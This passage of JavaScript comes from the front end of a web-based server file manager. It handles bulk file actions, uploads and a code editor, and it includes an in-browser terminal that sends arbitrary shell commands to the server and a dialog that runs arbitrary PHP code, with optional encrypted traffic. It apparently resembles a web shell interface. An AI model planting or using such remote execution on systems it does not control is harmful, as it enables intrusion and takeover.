                            console.log('Sending files for deletion:', filesToDelete);
                            
                            sendBulkActionRequest({
                                action: 'delete',
                                files: filesToDelete,
                                onSuccess: () => {
                                    clearFileSelection();
                                    triggerAlert('success', 'Files deleted successfully');
                                    loadDirectory(currentDir, 1, csrf, key, isEnc);
                                }
                            });
                        } else {
                            triggerAlert('warning', 'No files selected for deletion.');
                        }
                    }
                );
                break;

            case 'zip':
                showZipCreationDialog(
                    'Create Zip Archive',
                    'Enter the name for the zip file:',
                    'Create',
                    'archive.zip',
                    (zipOptions) => {
                        if (zipOptions) {
                            const filesToZip = getSelectedFiles();
                            
                            if (filesToZip.length === 0) {
                                triggerAlert('warning', 'No files selected for archiving.');
                                return;
                            }
                            
                            const format = zipOptions.archiveFormat;
                            let filename = zipOptions.zipFileName;
                            
                            if (!filename.toLowerCase().endsWith('.' + format)) {
                                if (filename.includes('.')) {
                                    filename = filename.substring(0, filename.lastIndexOf('.'));
                                }
                                filename += '.' + format;
                            }
                            
                            zipOptions.zipFileName = filename;
                            
                            sendBulkActionRequest({
                                action: 'zip',
                                files: filesToZip,
                                options: zipOptions,
                                onSuccess: () => {
                                    clearFileSelection();
                                    triggerAlert('success', 'Archive created successfully');
                                    loadDirectory(currentDir, 1, csrf, key, isEnc);
                                }
                            });
                        }
                    }
                );
                break;

            case 'unzip':
                if (selectedFiles.length > 1) {
                    const extensions = selectedFiles.map(file => {
                        const ext = file.split('.').pop().toLowerCase();
                        if (['gz', 'bz2', 'xz'].includes(ext)) {
                            const baseName = file.substring(0, file.lastIndexOf('.'));
                            if (baseName.toLowerCase().endsWith('.tar')) {
                                return `tar.${ext}`;
                            }
                        }
                        return ext;
                    });
                    
                    const allSameType = extensions.every(ext => ext === extensions[0]);
                    
                    if (!allSameType) {
                showConfirmation(
                            'Warning: Different Archive Types',
                            'You\'ve selected different types of archives. This may cause extraction issues. Continue anyway?',
                            'Continue',
                            () => {
                                const filesToExtract = getSelectedFiles();
                                
                                if (filesToExtract.length > 0) {
                                    sendBulkActionRequest({
                                        action: 'unzip',
                                        files: filesToExtract,
                                        onSuccess: () => {
                                            clearFileSelection();
                                            triggerAlert('success', 'Archives extracted successfully');
                                            loadDirectory(currentDir, 1, csrf, key, isEnc);
                                        }
                                    });
                                }
                            }
                        );
                        return;
                    }
                }
                
                showConfirmation(
                    'Extract Archive',
                    selectedFiles.length > 1 
                        ? `Extract ${selectedFiles.length} archives to the current directory?` 
                        : `Extract "${selectedFiles[0]}" to the current directory?`,
                    'Extract',
                    () => {
                        const filesToExtract = getSelectedFiles();
                        
                        if (filesToExtract.length > 0) {
                        sendBulkActionRequest({
                            action: 'unzip',
                            files: filesToExtract,
                            onSuccess: () => {
                                clearFileSelection();
                                triggerAlert('success', 'Archives extracted successfully');
                                loadDirectory(currentDir, 1, csrf, key, isEnc);
                            }
                        });
                        }
                    }
                );
                break;

            case 'copy':
                if (selectedFiles.length > 0) {
                    const filesWithPaths = selectedFiles.map(file => {
                    if (!file.includes('/')) {
                        return `${currentDir}/${file}`;
                    }
                    return file;
                });
                    
                    localStorage.setItem('copiedFiles', JSON.stringify(filesWithPaths));
                    triggerAlert('success', `${selectedFiles.length} file(s) copied to clipboard`);
                }
                break;

            case 'paste':
                try {
                    const clipboardFiles = JSON.parse(localStorage.getItem('copiedFiles') || '[]');
                    
                    if (clipboardFiles.length > 0) {
                        sendBulkActionRequest({
                            action: 'paste',
                            files: clipboardFiles,
                            onSuccess: () => {
                                clearFileSelection();
                                triggerAlert('success', 'Files pasted successfully');
                                loadDirectory(currentDir, 1, csrf, key, isEnc);
                                localStorage.removeItem('copiedFiles');
                            }
                        });
                } else {
                        triggerAlert('warning', 'No files in clipboard to paste');
                }
                } catch (error) {
                    console.error('Error reading clipboard:', error);
                    triggerAlert('error', 'Failed to read clipboard data');
                }
                break;

            default:
                console.log('Unknown action:', action);
                break;
        }
    });
    
    function sendBulkActionRequest({ action, files, options = null, onSuccess = null, onError = null }) {
        progr();
        
        console.log(`Sending ${action} request for ${files.length} file(s)`);
        
        const data = {
            csrf: csrf,
            action: action,
            file: files,
            dir: currentDir
        };
        
        if (action === 'zip' && options) {
            data.zipExt = options.zipFileName;
            data.compressionLevel = options.compressionLevel || '5';
            data.archiveFormat = options.archiveFormat || 'zip';
        }
        
        const jsonData = JSON.stringify(data);
        const requestData = (isEnc === '1') ? encrypt(jsonData, key) : jsonData;
        
        $.post('', requestData, function(response) {
            try {
                const decryptedResponse = (isEnc === '1') ? decrypt(response, key) : response;
                const result = JSON.parse(decryptedResponse);
                
                console.log('Response:', result);
                
                if (result.error) {
                    triggerAlert('warning', result.error);
                    if (onError) onError(result.error);
                } else if (result.success) {
                    if (onSuccess) onSuccess(result);
                    else triggerAlert('success', result.success);
                } else {
                    if (onSuccess) onSuccess(result);
                    else triggerAlert('success', 'Operation completed successfully');
                }
            } catch (error) {
                console.error('Error processing response:', error);
                triggerAlert('error', 'Failed to process server response');
                if (onError) onError(error);
            }
            
            dprogr();
        }).fail(function(xhr, status, error) {
            console.error('Request failed:', status, error);
            triggerAlert('error', 'Request failed: ' + (error || 'Unknown error'));
            if (onError) onError(error);
            dprogr();
        });
    }

    const dropZone = document.getElementById('dropZone');
    const fileInput = document.getElementById('fileInput');
    const uploadForm = document.getElementById('uploadForm');
    const uploadProgress = document.getElementById('uploadProgress');
    const progressBar = document.getElementById('progressBar');
    const progressText = document.getElementById('progressText');

    if (dropZone && fileInput && uploadForm && uploadProgress && progressBar && progressText) {
        ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
            dropZone.addEventListener(eventName, preventDefaults, false);
        });

        function preventDefaults(e) {
            e.preventDefault();
            e.stopPropagation();
        }

        ['dragenter', 'dragover'].forEach(eventName => {
            dropZone.addEventListener(eventName, () => dropZone.classList.add('bg-blue-50', 'dark:bg-gray-600'), false);
        });

        ['dragleave', 'drop'].forEach(eventName => {
            dropZone.addEventListener(eventName, () => dropZone.classList.remove('bg-blue-50', 'dark:bg-gray-600'), false);
        });

        dropZone.addEventListener('drop', handleDrop, false);

        function handleDrop(e) {
            const files = e.dataTransfer.files;
            if (files.length > 0) {
                fileInput.files = files; 
                updir = currentDir;
                handleFiles(updir);
            }
        }

        fileInput.addEventListener('change', handleFiles);

        dropZone.addEventListener('click', () => fileInput.click());

        function handleFiles(updir) {
            uploadProgress.classList.remove('hidden');
            progressBar.style.width = '0%';
            progressText.textContent = 'Uploading...';

            const formData = new FormData(uploadForm);
            formData.append('updir', currentDir);
            formData.append('csrf', csrf); 

            fetch('', {
                method: 'POST',
                body: formData,
            })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        progressText.textContent = 'Upload complete!';
                        setTimeout(() => uploadProgress.classList.add('hidden'), 3000);
                        loadDirectory(currentDir, 1, csrf, key, isEnc); 
                    } else {
                        progressText.textContent = data.error || 'Upload failed. Please try again.';
                    }
                })
                .catch(error => {
                    progressText.textContent = 'Upload failed. Please try again.';
                    console.error('Error:', error);
                });
        }
    }

    document.addEventListener('click', function (event) {
     
        if (event.target.classList.contains('file-link')) {
            event.preventDefault(); 
            const filePath = event.target.dataset.file; 
            viewEditFile(filePath, csrf, key, isEnc); 
        }
     
        
    });
 

    

    function initEditorEventListeners() {
        const cancelEdit = document.getElementById('cancelEdit');
        const cancelEditBtn = document.getElementById('cancelEditBtn');
        const editorLanguage = document.getElementById('editorLanguage');
        const saveFile = document.getElementById('saveFile');
        
        if (cancelEdit) {
            cancelEdit.addEventListener('click', function () {
                const editorModal = document.getElementById('editorModal');
                if (editorModal) {
                    editorModal.classList.add('hidden');
                }
    });
        }

        if (cancelEditBtn) {
            cancelEditBtn.addEventListener('click', function () {
                const editorModal = document.getElementById('editorModal');
                if (editorModal) {
                    editorModal.classList.add('hidden');
                }
    });
        }

        if (editorLanguage) {
            editorLanguage.addEventListener('change', function () {
        if (window.editor) {
            const newLanguage = this.value;
            const modeMap = {
                'javascript': 'javascript',
                'php': 'php',
                'html': 'htmlmixed',
                'css': 'css',
                'json': 'javascript',
                'plaintext': 'null'
            };
            const mode = modeMap[newLanguage] || 'null';
            
            window.editor.setOption('mode', mode);
                    
                    const editorStatus = document.getElementById('editorStatus');
                    if (editorStatus) {
                        editorStatus.textContent = `Language changed to ${newLanguage}`;
                    }
        }
    });
        }

        if (saveFile) {
            saveFile.addEventListener('click', function () {
        const newContent = window.editor ? window.editor.getValue() : '';
                const editorModal = document.getElementById('editorModal');
                const filePath = editorModal && editorModal.dataset.filePath ? editorModal.dataset.filePath : '';
        
                const editorStatus = document.getElementById('editorStatus');
                if (editorStatus) {
                    editorStatus.textContent = 'Saving...';
                }

        saveFileContent(filePath, newContent, csrf, key, isEnc);
    });
        }
    }
    
    initEditorEventListeners();

    function saveFileContent(filePath, content, csrf, key, isEnc) {
        progr();
        console.log('Saving file content for:', filePath);
        
        if (!content) {
            triggerAlert('warning', 'File content is empty.');
            dprogr();
            return;
        }

        if (!filePath) {
            triggerAlert('warning', 'No file path specified.');
            dprogr();
            return;
        }
        
        const tabContent = document.querySelector(`[data-file-path="${filePath}"]`);
        let fileType = '';
        
        if (tabContent) {
            const tabId = tabContent.id.replace('-content', '');
            const typeSelect = document.getElementById(`file-type-select-${tabId}`);
            if (typeSelect) {
                fileType = typeSelect.value;
            }
        }
        
        sendRequest({ 
            csrf, 
            action: 'save_content', 
            file: filePath, 
            content: content,
            file_type: fileType 
        }, key, isEnc)
            .then(response => {
                console.log('File saved successfully:', response);
                triggerAlert('success', 'File saved successfully');
                dprogr();
            })
            .catch(error => {
                console.error('Error saving file:', error);
                triggerAlert('danger', 'Failed to save file: ' + error);
                dprogr();
            });
    }

    function getLanguageFromFileName(fileName) {
        const extension = fileName.split('.').pop().toLowerCase();
        switch (extension) {
            case 'js': return 'javascript';
            case 'php': return 'php';
            case 'html': case 'htm': return 'htmlmixed';
            case 'css': return 'css';
            case 'json': return 'application/json';
            case 'xml': return 'xml';
            case 'md': return 'markdown';
            case 'py': return 'python';
            case 'rb': return 'ruby';
            case 'java': return 'text/x-java';
            case 'c': return 'text/x-csrc';
            case 'cpp': case 'cc': case 'h': case 'hpp': return 'text/x-c++src';
            case 'cs': return 'text/x-csharp';
            case 'go': return 'text/x-go';
            case 'rs': return 'text/x-rustsrc';
            case 'ts': return 'text/typescript';
            case 'sql': return 'sql';
            case 'sh': case 'bash': return 'shell';
            case 'yml': case 'yaml': return 'yaml';
            case 'txt': return 'text';
            default: return 'plaintext';
        }
    }

    function viewEditFile(filePath, csrf, key, isEnc) {
        progr();
        console.log('ViewEditFile called for:', filePath);
        
        try {
            const fileName = filePath.split('/').pop();
            
            const newTabId = addNewTab(fileName, 'editor');
            console.log('Created new tab with ID:', newTabId);
            
            setTimeout(() => {
                const tabContent = document.querySelector(`#${newTabId}-content`);
                if (!tabContent) {
                    console.error('Tab content not found for ID:', `${newTabId}-content`);
                    const tabsContentEl = document.getElementById('tabs-content');
                    console.log('Tabs content element found:', !!tabsContentEl);
                    if (tabsContentEl) {
                        console.log('Creating tab content manually');
                        const newTabContent = document.createElement('div');
                        newTabContent.id = `${newTabId}-content`;
                        newTabContent.className = 'tabs-panel w-full';
                        tabsContentEl.appendChild(newTabContent);
                        continueWithTabContent(newTabContent);
                    } else {
                        dprogr();
                        triggerAlert('warning', 'Failed to create editor tab. Try refreshing the page.');
                    }
                    return;
                }
                
                continueWithTabContent(tabContent);
            }, 100);
            
            function continueWithTabContent(tabContent) {
                tabContent.dataset.filePath = filePath;
                
                const fileManagerUI = document.getElementById('fileManagerUI');
                if (fileManagerUI) {
                    fileManagerUI.classList.add('hidden');
                }
                
                tabContent.classList.remove('hidden');
                
                const editorContainer = document.createElement('div');
                editorContainer.className = 'editor-container';
                editorContainer.style.width = '100%';
                editorContainer.style.height = '90vh';
                editorContainer.style.border = '1px solid #ddd';
                editorContainer.style.position = 'relative';
                tabContent.appendChild(editorContainer);
                
                const typeSelector = document.createElement('div');
                typeSelector.className = 'file-type-selector fixed top-4 right-4 z-50';
                typeSelector.innerHTML = `
                    <select id="file-type-select-${newTabId}" class="bg-white dark:bg-gray-700 border border-gray-300 dark:border-gray-600 rounded px-3 py-2 text-sm">
                        <option value="">Auto-detect</option>
                        <option value="javascript">JavaScript</option>
                        <option value="php">PHP</option>
                        <option value="htmlmixed">HTML</option>
                        <option value="css">CSS</option>
                        <option value="application/json">JSON</option>
                        <option value="xml">XML</option>
                        <option value="markdown">Markdown</option>
                        <option value="python">Python</option>
                        <option value="text/x-java">Java</option>
                        <option value="text/x-csrc">C</option>
                        <option value="text/x-c++src">C++</option>
                        <option value="sql">SQL</option>
                        <option value="shell">Shell/Bash</option>
                        <option value="yaml">YAML</option>
                        <option value="text">Plain Text</option>
                    </select>
                `;
                tabContent.appendChild(typeSelector);
                
        sendRequest({ csrf, action: 'view_content', file: filePath }, key, isEnc)
            .then(response => {
                        console.log('File content fetched successfully, length:', response.content?.length);
                        
                        if (typeof CodeMirror === 'undefined') {
                            console.error('CodeMirror is not defined!');
                            editorContainer.innerHTML = `<pre style="white-space: pre-wrap; padding: 1rem;">${response.content}</pre>`;
                            triggerAlert('warning', 'CodeMirror not found. Displaying content in plain text mode.');
                            dprogr();
                            return;
                        }
                        
                        const language = response.file_type || getLanguageFromFileName(filePath);
                        
                        const editor = CodeMirror(editorContainer, {
                            value: response.content || '',
                            mode: language,
                            theme: document.documentElement.classList.contains('dark') ? 'dracula' : 'eclipse',
                            lineNumbers: true,
                            lineWrapping: true,
                            matchBrackets: true,
                            autoCloseBrackets: true,
                            styleActiveLine: true
                        });
                        
                        window.editor = editor;
                        
                        editor.setSize('100%', '100%');
                        
                        const typeSelect = document.getElementById(`file-type-select-${newTabId}`);
                        if (typeSelect) {
                            const options = Array.from(typeSelect.options);
                            const matchingOption = options.find(option => option.value === language);
                            if (matchingOption) {
                                typeSelect.value = language;
                            }
                            
                            typeSelect.addEventListener('change', () => {
                                const newMode = typeSelect.value || getLanguageFromFileName(filePath);
                                editor.setOption('mode', newMode);
                                sendRequest({ 
                                    csrf, 
                                    action: 'view_content', 
                                    file: filePath,
                                    file_type: newMode 
                                }, key, isEnc);
                                setTimeout(() => editor.refresh(), 50);
                            });
                        }
                        
                        let saveBtn = tabContent.querySelector('.save-file-btn');
                        if (!saveBtn) {
                            saveBtn = document.createElement('button');
                            saveBtn.className = 'save-file-btn fixed bottom-4 right-4 bg-blue-500 hover:bg-blue-600 text-white py-2 px-4 rounded shadow-lg z-50';
                            saveBtn.innerHTML = '<i class="fas fa-save mr-2"></i> Save';
                            saveBtn.addEventListener('click', () => {
                                const content = editor.getValue();
                                saveFileContent(filePath, content, csrf, key, isEnc);
                            });
                            tabContent.appendChild(saveBtn);
                        }
                        
                        setTimeout(() => {
                            if (editor) {
                                editor.refresh();
                                editor.focus();
                            }
                        }, 100);
                        
                        dprogr();
            })
            .catch(error => {
                        console.error('Error fetching file content:', error);
                        editorContainer.innerHTML = '<div class="p-4 text-red-500">Failed to load file content: ' + error + '</div>';
                        dprogr();
            });
            }
        } catch (error) {
            console.error('Error in viewEditFile:', error);
            dprogr();
        }
    }

    let editorInitialized = false;

    window.initializeEditor = function(content, language = 'plaintext', containerId = 'editorContainer') {
        progr();
        
        const container = document.getElementById(containerId);
        if (!container) {
            console.error('Editor container not found:', containerId);
            dprogr();
            return;
        }
        
        const theme = document.documentElement.classList.contains('dark') 
            ? 'dracula' 
            : 'eclipse';
        
        try {
                const extraKeys = {
                    "Ctrl-S": function(cm) {
                    const tabContent = container.closest('[id$="-content"]');
                    if (tabContent) {
                        const saveBtn = tabContent.querySelector('.save-file-btn');
                        if (saveBtn) saveBtn.click();
                    } else {
                        const saveBtn = document.getElementById('saveFile');
                        if (saveBtn) saveBtn.click();
                    }
                        return false;
                    },
                    "Ctrl-F": "findPersistent",
                    "Ctrl-H": "replace",
                    "Ctrl-/": "toggleComment",
                    "Tab": function(cm) {
                        if (cm.somethingSelected()) {
                            cm.indentSelection("add");
                        } else {
                            cm.replaceSelection("    ", "end");
                        }
                        return true;
                    },
                    "Shift-Tab": function(cm) {
                        cm.indentSelection("subtract");
                        return true;
                    },
                    "Ctrl-Q": function(cm) {
                        cm.foldCode(cm.getCursor());
                        return false;
                    },
                    "Esc": function(cm) {
                        if (cm.getOption("fullScreen")) cm.setOption("fullScreen", false);
                        return false;
                    }
                };
            
            container.innerHTML = '';
                
            const editor = CodeMirror(container, {
                    value: content || '',
                    mode: language,
                    theme: theme,
                    lineNumbers: true,
                    indentUnit: 4,
                    smartIndent: true,
                    indentWithTabs: false,
                    lineWrapping: true,
                    matchBrackets: true,
                    autoCloseBrackets: true,
                    autoCloseTags: true,
                    styleActiveLine: true,
                    selectionPointer: true,
                    tabSize: parseInt(localStorage.getItem('tab-size') || '4'),
                    extraKeys: extraKeys,
                    scrollbarStyle: 'native',
                    undoDepth: 200,
                    historyEventDelay: 200
                });
            
            window.editor = editor;
                
            editor.setSize('100%', '100%');
                
                setTimeout(() => {
                if (editor) editor.focus();
                }, 100);
            
            setTimeout(() => {
                if (editor) editor.refresh();
            }, 50);
            
            console.log(`CodeMirror editor initialized with mode: ${language} in container: ${containerId}`);
        } catch (error) {
            console.error('Error initializing CodeMirror editor:', error);
            triggerAlert('warning', 'Failed to initialize the editor. Please try again.');
        } finally {
        dprogr();
        }
    }
    
    window.createEditor = function(content, language) {
        console.log("createEditor called - redirecting to initializeEditor");
        
        if (typeof window.initializeEditor !== 'function') {
            console.error("initializeEditor function not found");
            triggerAlert('warning', 'Editor initialization failed. Please refresh the page.');
            return;
        }
        
        if (!document.getElementById('editorContainer')) {
            console.error("Editor container not found");
            triggerAlert('warning', 'Editor container not found in DOM. Please refresh the page.');
            return;
        }
        
        try {
            window.initializeEditor(content, language);
        } catch (error) {
            console.error("Error in createEditor:", error);
            triggerAlert('warning', 'Failed to initialize editor. Please try again.');
        }
    }

   function showEdit(txt){

        document.getElementById('editorModal').classList.remove('hidden');
        window.initializeEditor(txt, "bash");

    }
 
    $(document).ready(function () {
        if (!window.fileManagerState) {
            window.fileManagerState = {
                files: [],
                totalPages: 1,
                currentPage: 1,
                currentSort: { column: 'name', direction: 'asc' },
                selectedFiles: [],
                tabs: [
                    { id: 'tab-1', path: currentDir, active: true, name: 'Home' }
                ],
                activeTabId: 'tab-1'
            };
        } else if (!window.fileManagerState.currentSort) {
            window.fileManagerState.currentSort = { column: 'name', direction: 'asc' };
        }
         
        loadDirectory(currentDir, 1, csrf, key, isEnc);
        
        function updateSortIcons() {
            const { column, direction } = window.fileManagerState.currentSort;
            $('th[data-sort]').find('i.fas').removeClass('fa-sort-up fa-sort-down').addClass('fa-sort');
            const activeHeader = $(`th[data-sort="${column}"]`);
            if (activeHeader.length) {
                const icon = activeHeader.find('i.fas');
                icon.removeClass('fa-sort');
                icon.addClass(direction === 'asc' ? 'fa-sort-up' : 'fa-sort-down');
            }
        }
        
        setTimeout(updateSortIcons, 500); 
        
        function handleKeydown(e) {
            var keyCode = typeof e.which === "number" ? e.which : e.keyCode;

            if (keyCode === 8 || keyCode === 9 || keyCode === 46) {
                e.preventDefault();
                if (command !== '') {
                    if (keyCode === 8)
                        backSpace();
                    else if (keyCode === 46)
                        reverseBackSpace();
                    else if (keyCode === 9)
                        autoComplete();
                }
            }

            else if (e.ctrlKey && keyCode === 67) {
                autocomplete_position = 0;
                endLine();
                newLine();
                reset();
            }

            else if (keyCode === 13) {
                if (autocomplete_position !== 0) {
                    autocomplete_position = 0;
                    command = autocomplete_current_result;
                }

                if (command.toLowerCase().split(' ')[0] in commands)
                    commands[command.toLowerCase().split(' ')[0]](command.split(' ').slice(1));
                else if (command.length !== 0)
                    $.ajax({
                        type: 'POST',
                        async: false,
                        data: { command: command, path: path },
                        cache: false,
                        success: function (response) {
                            response = $.parseJSON(response);
                            path = response.path;
                            $('terminal content').append('<line><br>' + response.result + '</line>');
                        }
                    });

                endLine();
                addToHistory(command);
                newLine();
                reset();
                $('terminal content').scrollTop($('terminal content').prop("scrollHeight"));
            }

            else if ((keyCode === 35 || keyCode === 36 || keyCode === 37 || keyCode === 39) && command !== '') {
                e.preventDefault();
                $('line.current bl').remove();

                if (autocomplete_position !== 0) {
                    autocomplete_position = 0;
                    command = autocomplete_current_result;
                }

                if (keyCode === 35)
                    blink_position = 0;

                if (keyCode === 36)
                    blink_position = command.length * -1;

                if (keyCode === 37 && command.length !== Math.abs(blink_position))
                    blink_position--;

                if (keyCode === 39 && blink_position !== 0)
                    blink_position++;

                printCommand();
                normalizeHtml();
            }

            else if ((keyCode === 38 || keyCode === 40) && (command === '' || suggest)) {
                e.preventDefault();
                if (keyCode === 38
                    && command_history.length
                    && command_history.length >= history_index * -1 + 1) {

                    history_index--;
                    command = command_history[command_history.length + history_index];
                    printCommand();
                    normalizeHtml();
                    suggest = true;
                }
                else if (keyCode === 40
                    && command_history.length
                    && command_history.length >= history_index * -1
                    && history_index !== 0) {

                    history_index++;
                    command = (history_index === 0) ? '' : command_history[command_history.length + history_index];
                    printCommand();
                    normalizeHtml();
                    suggest = (history_index === 0) ? false : true;
                }
            }

            else if (keyCode === 32
                || keyCode === 222
                || keyCode === 220
                || (
                    (keyCode >= 45 && keyCode <= 195)
                    && !(keyCode >= 112 && keyCode <= 123)
                    && keyCode != 46
                    && keyCode != 91
                    && keyCode != 93
                    && keyCode != 144
                    && keyCode != 145
                    && keyCode != 45
                )
            ) {
                type(e.key);
                $('terminal content').scrollTop($('terminal content').prop("scrollHeight"));
            }
        }

        function localUpdateKeydownListener() {
            if ($('#terminal').is(':visible')) {
                $(document).on('keydown', handleKeydown);
            } else {
                $(document).off('keydown', handleKeydown);
            }
        }

        localUpdateKeydownListener();
        
        window.updateKeydownListener = localUpdateKeydownListener;

        $('[data-tabs-target]').on('click', function () {
            setTimeout(() => {
                if (window.updateKeydownListener) {
                    window.updateKeydownListener();
                }
            }, 100);
        });
    });

    function toggleNavigationElements() {
        const activeTabId = document.querySelector('[role="tab"][aria-selected="true"]')?.getAttribute('data-tabs-target');
        const locationTabsContainer = document.querySelector('.mb-4.border-b.border-gray-200.dark\\:border-gray-700');
        const breadcrumbs = document.getElementById('breadcrumbs');
        
         
        if (activeTabId && locationTabsContainer && breadcrumbs) {
            if (activeTabId === '#terminal' || activeTabId === '#config' || activeTabId === '#setting') {
                 locationTabsContainer.classList.add('hidden');
                breadcrumbs.classList.add('hidden');
            } else {
                 locationTabsContainer.classList.remove('hidden');
                breadcrumbs.classList.remove('hidden');
            }
        } else {
            console.warn('Could not find all required elements for navigation toggle');
        }
    }

    document.addEventListener('DOMContentLoaded', function() {
        toggleNavigationElements();
        
        document.querySelectorAll('[data-tabs-target]').forEach(tab => {
            tab.addEventListener('click', function() {
                setTimeout(toggleNavigationElements, 50);
            });
        });
        
        const tabObserver = new MutationObserver(mutations => {
            mutations.forEach(mutation => {
                if (mutation.attributeName === 'aria-selected') {
                    toggleNavigationElements();
                }
            });
        });
        
        document.querySelectorAll('[role="tab"]').forEach(tab => {
            tabObserver.observe(tab, { attributes: true, attributeFilter: ['aria-selected'] });
        });
    });

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', toggleNavigationElements);
    } else {
        toggleNavigationElements();
    }

    function reset() {
        command = '';
        history_index = 0;
        blink_position = 0;
        autocomplete_position = 0;
        autocomplete_current_result = '';
        suggest = false;
    }
    function endLine() {
        $('line.current bl').remove();
        $('line.current').removeClass('current');
    }
    function newLine() {
        $('terminal content').append('<line class="current"><path>' + path + '</path> <sp></sp> <t><bl></bl></t></line>');
    }
    function addToHistory(command) {
        if (command.length >= 2 && (command_history.length === 0 || command_history[command_history.length - 1] !== command))
            command_history[command_history.length] = command;
    }
    function normalizeHtml() {
        let res = $('line.current t').html();
        let nres = res.split(' ').length == 1 ? '<cm>' + res + '</cm>' : '<cm>' + res.split(' ')[0] + '</cm> <code>' + res.split(' ').slice(1).join(' ').replace(/</g, '&lt;').replace(/>/g, '&gt;') + '</code>';

        $('line.current t').html(nres.replace('&lt;bl&gt;&lt;/bl&gt;', '<bl></bl>'));
    }
    function printCommand(cmd = '') {
        if (cmd === '')
            cmd = command;
        else
            blink_position = 0;

        let part1 = cmd.substr(0, cmd.length + blink_position);
        let part2 = cmd.substr(cmd.length + blink_position);

        $('line.current t').html(part1 + '<bl></bl>' + part2);
    }
    function type(t) {
        history_index = 0;
        suggest = false;

        if (autocomplete_position !== 0) {
            autocomplete_position = 0;
            command = autocomplete_current_result;
        }
        if (command[command.length - 1] === '/' && t === '/')
            return;

        let part1 = command.substr(0, command.length + blink_position);
        let part2 = command.substr(command.length + blink_position);
        command = part1 + t + part2;

        printCommand();
        normalizeHtml();
    }
    function backSpace() {
        if (autocomplete_position !== 0) {
            autocomplete_position = 0;
            command = autocomplete_current_result;
        }

        let part1 = command.substr(0, command.length + blink_position);
        let part2 = command.substr(command.length + blink_position);
        command = part1.substr(0, part1.length - 1) + part2;

        printCommand();
        normalizeHtml();
    }
    function reverseBackSpace() {
        let part1 = command.substr(0, command.length + blink_position);
        let part2 = command.substr(command.length + blink_position);
        command = part1 + part2.substr(1);

        if (blink_position !== 0)
            blink_position++;

        printCommand();
        normalizeHtml();
    }
    function autoComplete() {
        if (autocomplete_search_for !== command) {
            autocomplete_search_for = command;
            autocomplete_temp_results = [];

            if (command.split(' ').length === 1) {
                let cmdlist = commands_list.concat(Object.keys(commands));
                autocomplete_temp_results = cmdlist
                    .filter(function (cm) { return (cm.length > command.length && cm.substr(0, command.length).toLowerCase() == command.toLowerCase()) ? true : false; })
                    .reverse().sort(function (a, b) { return b.length - a.length; });
            }

            else if (command.split(' ').length === 2) {
                let cmd = command.split(' ')[0];
                let cmd_parameter = command.split(' ')[1];
                var temp_cmd = '';

                if (cmd === 'cd' || cmd === 'cp' || cmd === 'mv' || cmd === 'cat') {
                    switch (cmd) {
                        case "cd": temp_cmd = 'ls -d ' + cmd_parameter + '*/'; break;
                        case "cp": case "mv": temp_cmd = 'ls -d ' + cmd_parameter + '*/'; break;
                        case "cat": temp_cmd = 'ls -p | grep -v /'; break;
                        default: temp_cmd = '';
                    }

                    $.ajax({
                        type: 'POST',
                        async: false,
                        data: { command: temp_cmd, path: path },
                        cache: false,
                        success: function (response) {
                            response = $.parseJSON(response);
                            autocomplete_temp_results = response.result.split('<br>')
                                .filter(function (cm) { return (cm.length !== 0) ? true : false; });
                        }
                    });
                }
            }
        }

        if (autocomplete_temp_results.length && autocomplete_temp_results.length > Math.abs(autocomplete_position)) {
            autocomplete_position--;
            autocomplete_current_result = ((command.split(' ').length === 2) ? command.split(' ')[0] + ' ' : '') + autocomplete_temp_results[autocomplete_temp_results.length + autocomplete_position];
            printCommand(autocomplete_current_result);
            normalizeHtml();
        }
        else {
            autocomplete_position = 0;
            autocomplete_current_result = '';
            printCommand();
            normalizeHtml();
        }
    }

    var commands = {
        'clear': clear,
        'history': history
    };

    function clear() {
        $('terminal content').html('');
    }

    function history(arg) {
        var res = [];
        let start_from = arg.length ? Number.isInteger(Number(arg[0])) ? Number(arg[0]) : 0 : 0;

        if (start_from != 0 && start_from <= command_history.length)
            for (var i = command_history.length - start_from; i < command_history.length; i++) { res[res.length] = (i + 1) + ' &nbsp;' + command_history[i]; }
        else
            command_history.forEach(function (item, index) { res[res.length] = (index + 1) + ' &nbsp;' + item; });

        $('terminal content').append('<line>' + res.join('<br>') + '</line>');
    }

    updateCurrentPath();

    document.getElementById("itemLimit").addEventListener("change", (e) => {
        const limit = e.target.value;
        console.log('Items per page changed to:', limit);

        localStorage.setItem('default-items-per-page', limit);

        window.fileManagerState.currentPage = 1;
        
        loadDirectory(currentDir, 1, csrf, key, isEnc, limit);
    });

    function excute(code, csrf, currentDir, key, isEnc) {
        const isDarkMode = document.documentElement.classList.contains('dark');
        
        Swal.fire({
            title: 'Execute PHP Code',
            html: `
                <div class="flex flex-col w-full">
                    <label for="php-code-input" class="text-left mb-2 text-gray-700 dark:text-gray-300 text-sm font-medium">Enter the PHP code to execute:</label>
                    <textarea id="php-code-input" rows="8" class="w-full p-3 text-gray-800 dark:text-gray-200 bg-white dark:bg-gray-700 border border-gray-300 dark:border-gray-600 rounded-md shadow-sm focus:border-blue-500 focus:ring focus:ring-blue-500 focus:ring-opacity-50 font-mono text-sm"></textarea>
                </div>
            `,
            showCancelButton: true,
            confirmButtonText: 'Execute',
            cancelButtonText: 'Cancel',
            customClass: {
                popup: 'dark:bg-gray-800 dark:text-gray-200',
                title: 'text-gray-800 dark:text-gray-200',
                confirmButton: 'bg-blue-600 hover:bg-blue-700 text-white',
                cancelButton: 'bg-gray-500 hover:bg-gray-600 text-white'
            },
            background: isDarkMode ? '#1F2937' : '#FFFFFF',
            focusConfirm: false,
            preConfirm: () => {
                const phpCode = document.getElementById('php-code-input').value;
                if (!phpCode || phpCode.trim() === '') {
                    Swal.showValidationMessage('Please enter PHP code to execute');
                    return false;
                }
                return phpCode;
            }
        }).then((result) => {
            if (result.isConfirmed && result.value) {
                const phpCode = result.value;
                sendRequest({ 
                    csrf, 
                    action: 'execute', 
                    code: phpCode.trim(), 
                    dir: currentDir 
                }, key, isEnc)
                    .then(response => {
                        Swal.fire({
                            title: 'PHP Execution Result',
                            html: `<div class="bg-white dark:bg-gray-800 rounded-lg p-4 shadow-md">
                                    <pre class="text-left overflow-auto max-h-96 text-gray-800 dark:text-gray-200 font-mono text-sm bg-gray-100 dark:bg-gray-700 p-4 rounded">${response.output}</pre>
                                  </div>`,
                            icon: 'info',
                            confirmButtonText: 'Close',
                            customClass: {
                                popup: 'dark:bg-gray-800 dark:text-gray-200',
                                title: 'text-gray-800 dark:text-gray-200',
